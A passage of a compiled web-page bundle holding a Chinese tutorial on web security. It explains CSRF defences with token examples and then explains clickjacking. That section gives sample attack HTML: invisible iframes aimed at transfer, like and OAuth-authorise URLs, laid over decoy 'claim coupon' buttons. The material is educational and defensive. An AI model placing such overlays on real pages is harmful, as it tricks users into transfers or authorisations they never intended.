\\u{1F3AD}\"})}),`\n`,(0,l.jsxs)(e.p,{children:[\"\\u9632\\u5FA1CSRF\\u7684\\u6838\\u5FC3\\u662F\",(0,l.jsx)(e.strong,{children:\"\\u9A8C\\u8BC1\\u8BF7\\u6C42\\u7684\\u5408\\u6CD5\\u6027\"}),\"\\u3002\\u4EE5\\u4E0B\\u662F\\u6700\\u4F73\\u5B9E\\u8DF5\\uFF1A\"]}),`\n`,(0,l.jsxs)(e.table,{children:[(0,l.jsx)(e.thead,{children:(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.th,{children:\"\\u9632\\u5FA1\\u63AA\\u65BD\"}),(0,l.jsx)(e.th,{children:\"\\u63CF\\u8FF0\"}),(0,l.jsx)(e.th,{children:\"\\u9002\\u7528\\u573A\\u666F\"})]})}),(0,l.jsxs)(e.tbody,{children:[(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"CSRF Token\"}),(0,l.jsx)(e.td,{children:\"\\u4E3A\\u6BCF\\u4E2A\\u4F1A\\u8BDD\\u751F\\u6210\\u552F\\u4E00Token\\uFF0C\\u63D0\\u4EA4\\u65F6\\u9A8C\\u8BC1\"}),(0,l.jsx)(e.td,{children:\"\\u8868\\u5355\\u63D0\\u4EA4\\u3001AJAX\\u8BF7\\u6C42\"})]}),(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"SameSite Cookie\"}),(0,l.jsxs)(e.td,{children:[\"\\u8BBE\\u7F6ECookie\\u4E3A \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"SameSite=Strict\"})})})}),\" \\u6216 \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"Lax\"})})})}),\"\\uFF0C\\u9650\\u5236\\u8DE8\\u7AD9\\u53D1\\u9001\"]}),(0,l.jsx)(e.td,{children:\"\\u6240\\u6709Cookie\"})]}),(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"\\u9A8C\\u8BC1Origin/Header\"}),(0,l.jsxs)(e.td,{children:[\"\\u68C0\\u67E5\\u8BF7\\u6C42\\u7684 \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"Origin\"})})})}),\" \\u6216 \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"Referer\"})})})}),\" \\u5934\\uFF0C\\u786E\\u4FDD\\u6765\\u6E90\\u5408\\u6CD5\"]}),(0,l.jsx)(e.td,{children:\"API\\u8BF7\\u6C42\"})]}),(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"\\u4E8C\\u6B21\\u9A8C\\u8BC1\"}),(0,l.jsx)(e.td,{children:\"\\u654F\\u611F\\u64CD\\u4F5C\\uFF08\\u5982\\u8F6C\\u8D26\\uFF09\\u8981\\u6C42\\u7528\\u6237\\u518D\\u6B21\\u8F93\\u5165\\u5BC6\\u7801\"}),(0,l.jsx)(e.td,{children:\"\\u9AD8\\u98CE\\u9669\\u64CD\\u4F5C\"})]})]})]}),`\n`,(0,l.jsx)(e.h4,{id:\"\\u4EE3\\u7801\\u793A\\u4F8Bcsrf-token\",children:(0,l.jsx)(e.a,{href:\"#\\u4EE3\\u7801\\u793A\\u4F8Bcsrf-token\",children:\"\\u4EE3\\u7801\\u793A\\u4F8B\\uFF1ACSRF Token\"})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u540E\\u7AEF\\u751F\\u6210Token\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",children:(0,l.jsxs)(e.code,{\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:[(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"const\"}),(0,l.jsx)(e.span,{style:{color:\"#79B8FF\"},children:\" csrfToken\"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\" =\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" crypto.\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"randomUUID\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"();\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"res.\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"cookie\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'csrfToken'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\", csrfToken, { httpOnly: \"}),(0,l.jsx)(e.span,{style:{color:\"#79B8FF\"},children:\"true\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" });\"})]})]})})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u524D\\u7AEF\\u8868\\u5355\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"html\",\"data-theme\":\"github-dark\",children:(0,l.jsxs)(e.code,{\"data-language\":\"html\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:[(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"form\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" action\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"/transfer\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" method\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"POST\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"  <\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"input\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" type\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"hidden\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" name\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"_csrf\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" value\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"'}),(0,l.jsx)(e.span,{style:{color:\"#FDAEB7\",fontStyle:\"italic\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'%= csrfToken %>\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"  <\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"input\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" type\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"text\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" name\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"amount\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"  <\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"button\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" type\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"submit\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\\u63D0\\u4EA4</\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"button\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"</\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"form\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]})]})})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u540E\\u7AEF\\u9A8C\\u8BC1\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",children:(0,l.jsxs)(e.code,{\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:[(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"if\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" (req.body._csrf \"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"!==\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" req.cookies.csrfToken) {\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"  return\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" res.\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"status\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#79B8FF\"},children:\"403\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\").\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"send\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'Invalid CSRF Token'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\");\"})]}),`\n`,(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"}\"})})]})})}),`\n`,(0,l.jsx)(e.p,{children:(0,l.jsxs)(e.em,{children:[\"\\u5C0FTips\\uFF1A\\u4F7F\\u7528\\u6846\\u67B6\\uFF08\\u5982Express\\u7684\",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"csurf\"})})})}),\"\\u4E2D\\u95F4\\u4EF6\\uFF09\\u80FD\\u7B80\\u5316CSRF\\u9632\\u62A4\\uFF0C\\u4F46\\u4ECD\\u9700\\u68C0\\u67E5\\u914D\\u7F6E\\u3002\"]})}),`\n`,(0,l.jsx)(e.h3,{id:\"25-csrf\\u7684\\u54F2\\u5B66\\u6743\\u9650\\u4E0E\\u8FB9\\u754C\",children:(0,l.jsx)(e.a,{href:\"#25-csrf\\u7684\\u54F2\\u5B66\\u6743\\u9650\\u4E0E\\u8FB9\\u754C\",children:\"2.5 CSRF\\u7684\\u54F2\\u5B66\\uFF1A\\u6743\\u9650\\u4E0E\\u8FB9\\u754C\"})}),`\n`,(0,l.jsxs)(e.p,{children:[\"CSRF\\u63D0\\u9192\\u6211\\u4EEC\\uFF0CWeb\\u5B89\\u5168\\u7684\\u672C\\u8D28\\u662F\",(0,l.jsx)(e.strong,{children:\"\\u6743\\u9650\\u7BA1\\u7406\"}),\"\\u3002Cookie\\u7684\\u81EA\\u52A8\\u53D1\\u9001\\u673A\\u5236\\u662F\\u4FBF\\u5229\\u4E0E\\u98CE\\u9669\\u7684\\u5E73\\u8861\\uFF0C\\u800CCSRF\\u5219\\u662F\\u5BF9\\u8FD9\\u79CD\\u4FBF\\u5229\\u7684\\u6EE5\\u7528\\u3002\\u5F00\\u53D1\\u8005\\u9700\\u8981\\u660E\\u786E\\u6BCF\\u4E2A\\u8BF7\\u6C42\\u7684\\u8FB9\\u754C\\uFF0C\\u786E\\u4FDD\\u201C\\u8C01\\u5728\\u64CD\\u4F5C\\u201D\\u5F97\\u5230\\u9A8C\\u8BC1\\u3002\"]}),`\n`,(0,l.jsxs)(e.blockquote,{children:[`\n`,(0,l.jsx)(e.p,{children:\"\\u201C\\u6743\\u9650\\u662F\\u81EA\\u7531\\u7684\\u4EE3\\u4EF7\\uFF0C\\u8FB9\\u754C\\u662F\\u5B89\\u5168\\u7684\\u57FA\\u77F3\\u3002\\u201D \\u2014\\u2014 \\u539F\\u521B\"}),`\n`]}),`\n`,(0,l.jsx)(e.p,{children:\"\\u5728\\u5FAE\\u670D\\u52A1\\u67B6\\u6784\\u4E2D\\uFF0CCSRF\\u9632\\u62A4\\u9700\\u8981\\u4E0EAPI\\u7F51\\u5173\\u3001\\u8BA4\\u8BC1\\u7CFB\\u7EDF\\u534F\\u540C\\uFF0C\\u786E\\u4FDD\\u8DE8\\u57DF\\u8BF7\\u6C42\\u7684\\u5B89\\u5168\\u6027\\u3002\\u8FD9\\u4E0D\\u4EC5\\u662F\\u6280\\u672F\\u95EE\\u9898\\uFF0C\\u66F4\\u662F\\u8BBE\\u8BA1\\u54F2\\u5B66\\u7684\\u4F53\\u73B0\\u3002\"}),`\n`,(0,l.jsx)(e.h2,{id:\"\\u4E09\\u70B9\\u51FB\\u52AB\\u6301ui\\u7684\\u969C\\u773C\\u6CD5-\",children:(0,l.jsx)(e.a,{href:\"#\\u4E09\\u70B9\\u51FB\\u52AB\\u6301ui\\u7684\\u969C\\u773C\\u6CD5-\",children:\"\\u4E09\\u3001\\u70B9\\u51FB\\u52AB\\u6301\\uFF1AUI\\u7684\\u201C\\u969C\\u773C\\u6CD5\\u201D \\u{1FA84}\"})}),`\n`,(0,l.jsx)(e.h3,{id:\"31-\\u70B9\\u51FB\\u52AB\\u6301\\u662F\\u4EC0\\u4E48\",children:(0,l.jsx)(e.a,{href:\"#31-\\u70B9\\u51FB\\u52AB\\u6301\\u662F\\u4EC0\\u4E48\",children:\"3.1 \\u70B9\\u51FB\\u52AB\\u6301\\u662F\\u4EC0\\u4E48\\uFF1F\"})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u70B9\\u51FB\\u52AB\\u6301\\uFF08Clickjacking\\uFF09\\u662F\\u4E00\\u79CD\\u901A\\u8FC7\\u6B3A\\u9A97\\u7528\\u6237\\u70B9\\u51FB\\u9690\\u85CF\\u6216\\u4F2A\\u88C5\\u7684UI\\u5143\\u7D20\\uFF0C\\u8BF1\\u5BFC\\u6267\\u884C\\u975E\\u9884\\u671F\\u64CD\\u4F5C\\u7684\\u653B\\u51FB\\u3002\\u653B\\u51FB\\u8005\\u901A\\u5E38\\u4F7F\\u7528\\u900F\\u660E\\u7684iframe\\u8986\\u76D6\\u5408\\u6CD5\\u9875\\u9762\\uFF0C\\u6355\\u83B7\\u7528\\u6237\\u70B9\\u51FB\\u3002\"}),`\n`,(0,l.jsx)(e.p,{children:\"\\u7C7B\\u6BD4\\u4E00\\u4E0B\\uFF0C\\u70B9\\u51FB\\u52AB\\u6301\\u5C31\\u50CF\\u4E00\\u4E2A\\u201C\\u969C\\u773C\\u6CD5\\u201D\\u9B54\\u672F\\u5E08\\uFF1A\\u4F60\\u4EE5\\u4E3A\\u4F60\\u5728\\u70B9\\u201C\\u9886\\u53D6\\u4F18\\u60E0\\u5238\\u201D\\uFF0C\\u5B9E\\u9645\\u4E0A\\u5374\\u70B9\\u4E86\\u4E2A\\u201C\\u8BA2\\u9605\\u4ED8\\u8D39\\u670D\\u52A1\\u201D\\u3002\\u{1F3A9}\"}),`\n`,(0,l.jsx)(e.h3,{id:\"32-\\u70B9\\u51FB\\u52AB\\u6301\\u7684\\u539F\\u7406\\u89C6\\u89C9\\u7684\\u6B3A\\u9A97\",children:(0,l.jsx)(e.a,{href:\"#32-\\u70B9\\u51FB\\u52AB\\u6301\\u7684\\u539F\\u7406\\u89C6\\u89C9\\u7684\\u6B3A\\u9A97\",children:\"3.2 \\u70B9\\u51FB\\u52AB\\u6301\\u7684\\u539F\\u7406\\uFF1A\\u89C6\\u89C9\\u7684\\u6B3A\\u9A97\"})}),`\n`,(0,l.jsxs)(e.p,{children:[\"\\u70B9\\u51FB\\u52AB\\u6301\\u7684\\u6838\\u5FC3\\u5728\\u4E8E\",(0,l.jsx)(e.strong,{children:\"UI\\u6B3A\\u9A97\"}),\"\\u3002\\u653B\\u51FB\\u8005\\u901A\\u8FC7CSS\\uFF08\\u5982 \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"opacity: 0\"})})})}),\"\\uFF09\\u9690\\u85CFiframe\\uFF0C\\u5C06\\u6076\\u610F\\u9875\\u9762\\u53E0\\u52A0\\u5728\\u5408\\u6CD5\\u9875\\u9762\\u4E0A\\u3002\\u7528\\u6237\\u70B9\\u51FB\\u65F6\\uFF0C\\u5B9E\\u9645\\u89E6\\u53D1\\u4E86iframe\\u4E2D\\u7684\\u64CD\\u4F5C\\u3002\"]}),`\n`,(0,l.jsx)(e.p,{children:\"\\u4F8B\\u5982\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"html\",\"data-theme\":\"github-dark\",children:(0,l.jsxs)(e.code,{\"data-language\":\"html\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:[(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"iframe\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" src\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"http://bank.com/transfer?to=evil\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" style\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"opacity: 0; position: absolute;\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"></\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"iframe\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]}),`\n`,(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"div\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\\u70B9\\u51FB\\u9886\\u53D6\\u4F18\\u60E0\\u5238\\uFF01</\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"div\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]})]})})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u7528\\u6237\\u70B9\\u51FB\\u201C\\u4F18\\u60E0\\u5238\\u201D\\uFF0C\\u5B9E\\u9645\\u89E6\\u53D1\\u4E86\\u8F6C\\u8D26\\u3002\"}),`\n`,(0,l.jsx)(e.p,{children:(0,l.jsx)(e.em,{children:\"\\u5C0FTips\\uFF1A\\u70B9\\u51FB\\u52AB\\u6301\\u4F9D\\u8D56\\u89C6\\u89C9\\u6B3A\\u9A97\\uFF0C\\u9632\\u5FA1\\u65F6\\u8981\\u9650\\u5236iframe\\u7684\\u4F7F\\u7528\\u3002\"})}),`\n`,(0,l.jsx)(e.h3,{id:\"33-\\u70B9\\u51FB\\u52AB\\u6301\\u653B\\u51FB\\u5B9E\\u4F8B\\u4ECE\\u70B9\\u8D5E\\u5230\\u6388\\u6743\",children:(0,l.jsx)(e.a,{href:\"#33-\\u70B9\\u51FB\\u52AB\\u6301\\u653B\\u51FB\\u5B9E\\u4F8B\\u4ECE\\u70B9\\u8D5E\\u5230\\u6388\\u6743\",children:\"3.3 \\u70B9\\u51FB\\u52AB\\u6301\\u653B\\u51FB\\u5B9E\\u4F8B\\uFF1A\\u4ECE\\u70B9\\u8D5E\\u5230\\u6388\\u6743\"})}),`\n`,(0,l.jsx)(e.h4,{id:\"\\u5B9E\\u4F8B1\\u793E\\u4EA4\\u5A92\\u4F53\\u70B9\\u8D5E\",children:(0,l.jsx)(e.a,{href:\"#\\u5B9E\\u4F8B1\\u793E\\u4EA4\\u5A92\\u4F53\\u70B9\\u8D5E\",children:\"\\u5B9E\\u4F8B1\\uFF1A\\u793E\\u4EA4\\u5A92\\u4F53\\u70B9\\u8D5E\"})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u653B\\u51FB\\u8005\\u5D4C\\u5165\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"html\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.code,{\"data-language\":\"html\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"iframe\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" src\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"http://social.com/like?postId=evil\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" style\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"opacity: 0;\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"></\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"iframe\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]})})})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u7528\\u6237\\u70B9\\u51FB\\u9875\\u9762\\uFF0C\\u5B9E\\u9645\\u4E3A\\u6076\\u610F\\u5E16\\u5B50\\u70B9\\u8D5E\\u3002\"}),`\n`,(0,l.jsx)(e.h4,{id:\"\\u5B9E\\u4F8B2oauth\\u6388\\u6743\",children:(0,l.jsx)(e.a,{href:\"#\\u5B9E\\u4F8B2oauth\\u6388\\u6743\",children:\"\\u5B9E\\u4F8B2\\uFF1AOAuth\\u6388\\u6743\"})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u653B\\u51FB\\u8005\\u4F2A\\u9020\\u6388\\u6743\\u9875\\u9762\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"html\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.code,{\"data-language\":\"html\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"iframe\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" src\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"http://app.com/authorize?client_id=evil\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" style\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"opacity: 0;\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"></\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"iframe\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]})})})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u7528\\u6237\\u70B9\\u51FB\\u540E\\uFF0C\\u65E0\\u610F\\u4E2D\\u6388\\u6743\\u4E86\\u6076\\u610F\\u5E94\\u7528\\u3002\"}),`\n`,(0,l.jsx)(e.p,{children:(0,l.jsx)(e.em,{children:\"\\u5C0FTips\\uFF1A\\u654F\\u611F\\u64CD\\u4F5C\\u7684UI\\u5E94\\u660E\\u786E\\u63D0\\u793A\\u7528\\u6237\\uFF0C\\u907F\\u514D\\u201C\\u9690\\u5F62\\u70B9\\u51FB\\u201D\\u3002\"})}),`\n`,(0,l.jsx)(e.h3,{id:\"34-\\u70B9\\u51FB\\u52AB\\u6301\\u9632\\u5FA1\\u5B88\\u62A4\\u7528\\u6237\\u7684\\u6BCF\\u4E00\\u6B21\\u70B9\\u51FB-\\uFE0F\",children:(0,l.jsx)(e.a,{href:\"#34-\\u70B9\\u51FB\\u52AB\\u6301\\u9632\\u5FA1\\u5B88\\u62A4\\u7528\\u6237\\u7684\\u6BCF\\u4E00\\u6B21\\u70B9\\u51FB-\\uFE0F\",children:\"3.4 \\u70B9\\u51FB\\u52AB\\u6301\\u9632\\u5FA1\\uFF1A\\u5B88\\u62A4\\u7528\\u6237\\u7684\\u6BCF\\u4E00\\u6B21\\u70B9\\u51FB \\u{1F5B1}\\uFE0F\"})}),`\n`,(0,l.jsxs)(e.p,{children:[\"\\u9632\\u5FA1\\u70B9\\u51FB\\u52AB\\u6301\\u7684\\u5173\\u952E\\u662F\",(0,l.jsx)(e.strong,{children:\"\\u9650\\u5236iframe\"}),\"\\u548C\",(0,l.jsx)(e.strong,{children:\"\\u660E\\u786E\\u7528\\u6237\\u610F\\u56FE\"}),\"\\u3002\\u4EE5\\u4E0B\\u662F\\u6700\\u4F73\\u5B9E\\u8DF5\\uFF1A\"]}),`\n`,(0,l.jsxs)(e.table,{children:[(0,l.jsx)(e.thead,{children:(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.th,{children:\"\\u9632\\u5FA1\\u63AA\\u65BD\"}),(0,l.jsx)(e.th,{children:\"\\u63CF\\u8FF0\"}),(0,l.jsx)(e.th,{children:\"\\u9002\\u7528\\u573A\\u666F\"})]})}),(0,l.jsxs)(e.tbody,{children:[(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"X-Frame-Options\"}),(0,l.jsxs)(e.td,{children:[\"\\u8BBE\\u7F6E\\u54CD\\u5E94\\u5934\\u4E3A \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"DENY\"})})})}),\" \\u6216 